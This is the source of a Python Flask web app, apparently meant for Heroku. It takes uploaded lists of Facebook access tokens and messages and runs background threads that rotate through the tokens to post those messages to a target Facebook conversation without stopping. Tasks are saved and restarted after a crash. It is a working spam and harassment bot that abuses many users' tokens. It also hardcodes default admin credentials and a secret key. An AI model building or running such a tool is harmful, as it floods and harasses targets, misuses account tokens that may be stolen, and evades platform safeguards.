from flask import Flask, request, render_template, redirect, session, url_for, jsonify
import os, threading, requests, time, json
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'Royalkinghere09')  # Heroku config var से लें
app.config['UPLOAD_FOLDER'] = 'uploads'
os.makedirs(app.config['UPLOAD_FOLDER'], exist_ok=True)

# Heroku compatible port configuration
PORT = int(os.environ.get('PORT', 20065))

tasks = {}
stop_flags = {}
start_times = {}
task_info = {}
task_stats = {}
TASKS_DATA_FILE = 'tasks_data.json'

def save_tasks_data():
    data = {}
    for task_id in task_info:
        data[task_id] = {
            "task_name": task_info[task_id]["task_name"],
            "task_password": task_info[task_id]["task_password"],
            "prefix": task_info[task_id]["prefix"],
            "convo_id": task_info[task_id]["convo_id"],
            "speed": task_info[task_id]["speed"],
            "token_list": task_info[task_id]["token_list"],
            "message_list": task_info[task_id]["message_list"],
            "start_time": start_times[task_id].isoformat()
        }
    with open(TASKS_DATA_FILE, 'w') as f:
        json.dump(data, f)

def load_tasks_data():
    if not os.path.exists(TASKS_DATA_FILE):
        return {}
    with open(TASKS_DATA_FILE, 'r') as f:
        return json.load(f)

def get_uid():
    return os.urandom(8).hex()

def convo_task(unique_id, token_list, message_list, convo_id, prefix, speed, task_name, task_password):
    tasks[unique_id] = threading.current_thread()
    stop_flags[unique_id] = False
    start_times[unique_id] = datetime.now()
    task_info[unique_id] = {
        "task_name": task_name,
        "task_password": task_password,
        "prefix": prefix,
        "convo_id": convo_id,
        "speed": speed,
        "token_list": token_list,
        "message_list": message_list
    }
    task_stats[unique_id] = {
        "total_tokens": len(token_list),
        "failed_tokens": 0,
        "successful_tokens": 0,
        "current_token": None,
    }
    save_tasks_data()
    token_index = 0
    message_index = 0
    print(f"[{datetime.now()}] Task {unique_id} started.")
    while not stop_flags.get(unique_id, True):
        try:
            token = token_list[token_index]
            message = message_list[message_index]
            full_message = f"{prefix} {message.strip()}"
            task_stats[unique_id]["current_token"] = token
            url = f"https://graph.facebook.com/v15.0/t_{convo_id}/"
            params = {'access_token': token, 'message': full_message}
            headers = {'User-Agent': 'Mozilla/5.0'}
            response = requests.post(url, json=params, headers=headers)
            if response.status_code == 200:
                task_stats[unique_id]["successful_tokens"] += 1
                print(f"\033[92m[{datetime.now()}] Message sent: {full_message}\033[0m")
            else:
                task_stats[unique_id]["failed_tokens"] += 1
                print(f"\033[91m[{datetime.now()}] Failed to send: {full_message} | Status: {response.status_code}\033[0m")
            token_index = (token_index + 1) % len(token_list)
            message_index = (message_index + 1) % len(message_list)
            time.sleep(speed)
        except Exception as e:
            task_stats[unique_id]["failed_tokens"] += 1
            print(f"\033[91m[{datetime.now()}] Error: {e}\033[0m")
            time.sleep(speed)
    print(f"[{datetime.now()}] Task {unique_id} stopped.")
    if unique_id in task_info:
        del task_info[unique_id]
    if unique_id in start_times:
        del start_times[unique_id]
    if unique_id in stop_flags:
        del stop_flags[unique_id]
    if unique_id in tasks:
        del tasks[unique_id]
    if unique_id in task_stats:
        del task_stats[unique_id]
    save_tasks_data()

from functools import wraps

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('logged_in'):
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        # Heroku environment variables से credentials
        admin_user = os.environ.get('ADMIN_USERNAME', 'Haseeb')
        admin_pass = os.environ.get('ADMIN_PASSWORD', 'haseebxd')
        
        if username == admin_user and password == admin_pass:
            session['logged_in'] = True
            return redirect(url_for('index'))
        else:
            error = 'Invalid Credentials. Please try again.'
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/', methods=['GET', 'POST'])
@login_required
def index():
    if request.method == 'POST':
        task_name = request.form['task_name'].strip()
        task_password = request.form['task_password'].strip()
        token_file = request.files['token_file']
        message_file = request.files['message_file']
        convo_id = request.form['convo_id'].strip()
        prefix = request.form['prefix'].strip()
        speed = int(request.form['speed'])
        
        # File uploads के लिए temporary paths
        import tempfile
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as tf:
            token_file_content = token_file.read().decode('utf-8')
            tf.write(token_file_content)
            token_path = tf.name
        
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as mf:
            message_file_content = message_file.read().decode('utf-8')
            mf.write(message_file_content)
            message_path = mf.name
        
        with open(token_path, 'r') as tf:
            token_list = [line.strip() for line in tf if line.strip()]
        with open(message_path, 'r') as mf:
            message_list = [line.strip() for line in mf if line.strip()]
        
        # Temporary files को delete करें
        os.unlink(token_path)
        os.unlink(message_path)
        
        unique_id = get_uid()
        thread = threading.Thread(target=convo_task, args=(unique_id, token_list, message_list, convo_id, prefix, speed, task_name, task_password))
        thread.start()
        return redirect('/')
    
    running_tasks = []
    for task_id in tasks.keys():
        if not stop_flags.get(task_id, True):
            uptime = datetime.now() - start_times[task_id]
            info = task_info[task_id]
            stats = task_stats.get(task_id, {})
            running_tokens = stats.get("successful_tokens", 0)
            failed_tokens = stats.get("failed_tokens", 0)
            total_tokens = stats.get("total_tokens", 0)
            total_messages = running_tokens + failed_tokens
            running_tasks.append({
                "id": task_id,
                "task_name": info.get("task_name", ""),
                "prefix": info.get("prefix", ""),
                "uptime": str(uptime).split('.')[0],
                "total_tokens": total_tokens,
                "total_messages": total_messages,
                "failed_tokens": failed_tokens,
                "running_tokens": running_tokens
            })
    return render_template('index.html', running_tasks=running_tasks)

@app.route('/stop/<task_id>', methods=['POST'])
@login_required
def stop(task_id):
    password = request.form.get('password', '')
    if task_id in task_info:
        if task_info[task_id]["task_password"] == password:
            stop_flags[task_id] = True
            return jsonify({"success": True})
        else:
            return jsonify({"success": False, "error": "Wrong password"})
    return jsonify({"success": False, "error": "Task not found"})

def restart_saved_tasks():
    data = load_tasks_data()
    for task_id, info in data.items():
        if task_id not in tasks:
            start_times[task_id] = datetime.fromisoformat(info["start_time"])
            task_name = info["task_name"]
            task_password = info["task_password"]
            prefix = info["prefix"]
            convo_id = info["convo_id"]
            speed = info["speed"]
            token_list = info["token_list"]
            message_list = info["message_list"]
            thread = threading.Thread(target=convo_task, args=(task_id, token_list, message_list, convo_id, prefix, speed, task_name, task_password))
            thread.start()
            print(f"Restarted task {task_id} after crash.")

if __name__ == '__main__':
    restart_saved_tasks()
    app.run(host='0.0.0.0', port=PORT)
